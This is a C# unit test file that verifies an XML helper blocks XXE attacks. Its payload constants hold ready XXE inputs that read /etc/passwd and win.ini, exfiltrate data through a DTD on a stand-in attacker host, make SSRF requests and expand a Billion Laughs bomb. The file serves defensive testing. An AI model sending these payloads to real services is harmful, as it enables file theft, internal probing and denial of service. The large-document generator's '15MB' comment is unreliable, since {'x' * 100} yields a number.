using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Linq;
using Honua.Server.Host.Utilities;
using Xunit;

namespace Honua.Server.Host.Tests.Security;

/// <summary>
/// Tests to verify protection against XXE (XML External Entity) attacks.
/// These tests ensure that all XML parsing in the application uses secure settings
/// that prevent entity expansion, DTD processing, and external resource resolution.
/// </summary>
[Trait("Category", "Unit")]
[Trait("Feature", "Security")]
[Trait("Speed", "Fast")]
public class XxePreventionTests
{
    #region Attack Payloads

    /// <summary>
    /// Classic XXE attack attempting to read /etc/passwd on Unix systems.
    /// This is the most common XXE attack vector.
    /// </summary>
    private const string ClassicXxePayload = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <Filter>
          <PropertyIsEqualTo>
            <PropertyName>name</PropertyName>
            <Literal>&xxe;</Literal>
          </PropertyIsEqualTo>
        </Filter>
        """;

    /// <summary>
    /// Parameter entity XXE attack that attempts to exfiltrate data.
    /// More sophisticated than classic XXE.
    /// </summary>
    private const string ParameterEntityXxePayload = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///etc/passwd">
          <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
          %dtd;
          %send;
        ]>
        <Filter>
          <PropertyIsEqualTo>
            <PropertyName>name</PropertyName>
            <Literal>test</Literal>
          </PropertyIsEqualTo>
        </Filter>
        """;

    /// <summary>
    /// Billion Laughs attack (XML bomb) that causes exponential entity expansion.
    /// This is a denial-of-service attack that can consume all available memory.
    /// </summary>
    private const string BillionLaughsPayload = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        ]>
        <Filter>&lol5;</Filter>
        """;

    /// <summary>
    /// XXE with external DTD attempting to access Windows system files.
    /// </summary>
    private const string WindowsXxePayload = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
        ]>
        <Filter>
          <PropertyIsEqualTo>
            <PropertyName>name</PropertyName>
            <Literal>&xxe;</Literal>
          </PropertyIsEqualTo>
        </Filter>
        """;

    /// <summary>
    /// XXE attempting to make HTTP request to external server (SSRF).
    /// Server-Side Request Forgery can access internal services.
    /// </summary>
    private const string SsrfXxePayload = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
        ]>
        <Filter>
          <PropertyIsEqualTo>
            <PropertyName>name</PropertyName>
            <Literal>&xxe;</Literal>
          </PropertyIsEqualTo>
        </Filter>
        """;

    /// <summary>
    /// XXE with nested entities to bypass basic filters.
    /// </summary>
    private const string NestedEntityPayload = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY a "test">
          <!ENTITY b "&a;&a;&a;">
          <!ENTITY c "&b;&b;&b;">
        ]>
        <Filter>
          <PropertyIsEqualTo>
            <PropertyName>name</PropertyName>
            <Literal>&c;</Literal>
          </PropertyIsEqualTo>
        </Filter>
        """;

    /// <summary>
    /// Valid XML without any XXE vulnerabilities (control test).
    /// </summary>
    private const string ValidXmlPayload = """
        <?xml version="1.0" encoding="UTF-8"?>
        <Filter>
          <PropertyIsEqualTo>
            <PropertyName>name</PropertyName>
            <Literal>validValue</Literal>
          </PropertyIsEqualTo>
        </Filter>
        """;

    /// <summary>
    /// Extremely large XML document to test DoS protection.
    /// Creates a 15MB XML document.
    /// </summary>
    private static string CreateLargeXmlPayload()
    {
        var sb = new StringBuilder();
        sb.AppendLine("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
        sb.AppendLine("<Filter>");

        // Create a very large XML structure (15MB of data)
        for (int i = 0; i < 100000; i++)
        {
            sb.AppendLine($"  <PropertyIsEqualTo><PropertyName>field{i}</PropertyName><Literal>{'x' * 100}</Literal></PropertyIsEqualTo>");
        }

        sb.AppendLine("</Filter>");
        return sb.ToString();
    }

    #endregion

    #region SecureXmlSettings Tests

    [Fact]
    public void CreateSecureSettings_ShouldProhibitDtdProcessing()
    {
        // Arrange & Act
        var settings = SecureXmlSettings.CreateSecureSettings();

        // Assert
        Assert.Equal(DtdProcessing.Prohibit, settings.DtdProcessing);
    }

    [Fact]
    public void CreateSecureSettings_ShouldDisableXmlResolver()
    {
        // Arrange & Act
        var settings = SecureXmlSettings.CreateSecureSettings();

        // Assert
        Assert.Null(settings.XmlResolver);
    }

    [Fact]
    public void CreateSecureSettings_ShouldSetCharacterLimits()
    {
        // Arrange & Act
        var settings = SecureXmlSettings.CreateSecureSettings();

        // Assert
        Assert.Equal(0, settings.MaxCharactersFromEntities);
        Assert.Equal(10_000_000, settings.MaxCharactersInDocument);
    }

    [Fact]
    public void ParseSecure_ValidXml_ShouldSucceed()
    {
        // Arrange
        var xml = ValidXmlPayload;

        // Act
        var doc = SecureXmlSettings.ParseSecure(xml);

        // Assert
        Assert.NotNull(doc);
        Assert.NotNull(doc.Root);
        Assert.Equal("Filter", doc.Root.Name.LocalName);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void ParseSecure_NullOrWhitespace_ShouldThrowArgumentException(string? input)
    {
        // Act & Assert
        Assert.Throws<ArgumentException>(() => SecureXmlSettings.ParseSecure(input!));
    }

    [Fact]
    public void ParseSecure_ClassicXxe_ShouldThrowXmlException()
    {
        // Arrange
        var xml = ClassicXxePayload;

        // Act & Assert
        var exception = Assert.Throws<XmlException>(() => SecureXmlSettings.ParseSecure(xml));

        // Verify the error is related to DTD processing
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ParseSecure_ParameterEntityXxe_ShouldThrowXmlException()
    {
        // Arrange
        var xml = ParameterEntityXxePayload;

        // Act & Assert
        var exception = Assert.Throws<XmlException>(() => SecureXmlSettings.ParseSecure(xml));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ParseSecure_BillionLaughs_ShouldThrowXmlException()
    {
        // Arrange
        var xml = BillionLaughsPayload;

        // Act & Assert
        var exception = Assert.Throws<XmlException>(() => SecureXmlSettings.ParseSecure(xml));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ParseSecure_WindowsXxe_ShouldThrowXmlException()
    {
        // Arrange
        var xml = WindowsXxePayload;

        // Act & Assert
        var exception = Assert.Throws<XmlException>(() => SecureXmlSettings.ParseSecure(xml));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ParseSecure_SsrfXxe_ShouldThrowXmlException()
    {
        // Arrange
        var xml = SsrfXxePayload;

        // Act & Assert
        var exception = Assert.Throws<XmlException>(() => SecureXmlSettings.ParseSecure(xml));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ParseSecure_NestedEntities_ShouldThrowXmlException()
    {
        // Arrange
        var xml = NestedEntityPayload;

        // Act & Assert
        var exception = Assert.Throws<XmlException>(() => SecureXmlSettings.ParseSecure(xml));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ParseSecure_ExtremelyLargeDocument_ShouldThrowXmlException()
    {
        // Arrange
        var xml = CreateLargeXmlPayload();

        // Act & Assert
        var exception = Assert.Throws<XmlException>(() => SecureXmlSettings.ParseSecure(xml));
        Assert.Contains("maximum allowed size", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task LoadSecureAsync_ValidXml_ShouldSucceed()
    {
        // Arrange
        var xml = ValidXmlPayload;
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(xml));

        // Act
        var doc = await SecureXmlSettings.LoadSecureAsync(stream);

        // Assert
        Assert.NotNull(doc);
        Assert.NotNull(doc.Root);
        Assert.Equal("Filter", doc.Root.Name.LocalName);
    }

    [Fact]
    public async Task LoadSecureAsync_ClassicXxe_ShouldThrowXmlException()
    {
        // Arrange
        var xml = ClassicXxePayload;
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(xml));

        // Act & Assert
        var exception = await Assert.ThrowsAsync<XmlException>(
            async () => await SecureXmlSettings.LoadSecureAsync(stream));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task LoadSecureAsync_BillionLaughs_ShouldThrowXmlException()
    {
        // Arrange
        var xml = BillionLaughsPayload;
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(xml));

        // Act & Assert
        var exception = await Assert.ThrowsAsync<XmlException>(
            async () => await SecureXmlSettings.LoadSecureAsync(stream));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void LoadSecure_ClassicXxe_ShouldThrowXmlException()
    {
        // Arrange
        var xml = ClassicXxePayload;
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(xml));

        // Act & Assert
        var exception = Assert.Throws<XmlException>(
            () => SecureXmlSettings.LoadSecure(stream));
        Assert.Contains("DTD", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ValidateStreamSize_SmallStream_ShouldSucceed()
    {
        // Arrange
        var data = new byte[1024]; // 1KB
        using var stream = new MemoryStream(data);

        // Act & Assert - should not throw
        SecureXmlSettings.ValidateStreamSize(stream);
    }

    [Fact]
    public void ValidateStreamSize_ExcessivelyLargeStream_ShouldThrowXmlException()
    {
        // Arrange
        var largeSize = SecureXmlSettings.MaxInputStreamSize + 1;
        using var stream = new FakeLargeStream(largeSize);

        // Act & Assert
        var exception = Assert.Throws<XmlException>(
            () => SecureXmlSettings.ValidateStreamSize(stream));
        Assert.Contains("exceeds maximum allowed size", exception.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ValidateStreamSize_NullStream_ShouldThrowArgumentNullException()
    {
        // Act & Assert
        Assert.Throws<ArgumentNullException>(() => SecureXmlSettings.ValidateStreamSize(null!));
    }

    #endregion

    #region Integration Tests

    /// <summary>
    /// Verifies that XDocument.Parse (the old method) is vulnerable to XXE.
    /// This test demonstrates what we're protecting against.
    /// </summary>
    [Fact]
    public void InsecureXDocumentParse_WithXxe_IsVulnerable()
    {
        // This test documents the vulnerability we're fixing
        // XDocument.Parse() by default ALLOWS DTD processing and entity expansion

        // Arrange - Simple entity expansion (not a full XXE attack)
        var xmlWithEntity = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY testEntity "expandedValue">
            ]>
            <root>&testEntity;</root>
            """;

        // Act & Assert
        // This will throw because DTD processing is involved
        // In older .NET versions, this might succeed, demonstrating the vulnerability
        Assert.ThrowsAny<XmlException>(() => XDocument.Parse(xmlWithEntity));
    }

    #endregion

    #region Helper Classes

    /// <summary>
    /// Fake stream that reports a large length without allocating memory.
    /// Used for testing stream size validation.
    /// </summary>
    private class FakeLargeStream : Stream
    {
        private readonly long _length;

        public FakeLargeStream(long length)
        {
            _length = length;
        }

        public override bool CanRead => true;
        public override bool CanSeek => true;
        public override bool CanWrite => false;
        public override long Length => _length;
        public override long Position { get; set; }

        public override void Flush() { }

        public override int Read(byte[] buffer, int offset, int count)
        {
            return 0; // Return 0 to indicate end of stream
        }

        public override long Seek(long offset, SeekOrigin origin)
        {
            return 0;
        }

        public override void SetLength(long value)
        {
            throw new NotSupportedException();
        }

        public override void Write(byte[] buffer, int offset, int count)
        {
            throw new NotSupportedException();
        }
    }

    #endregion
}
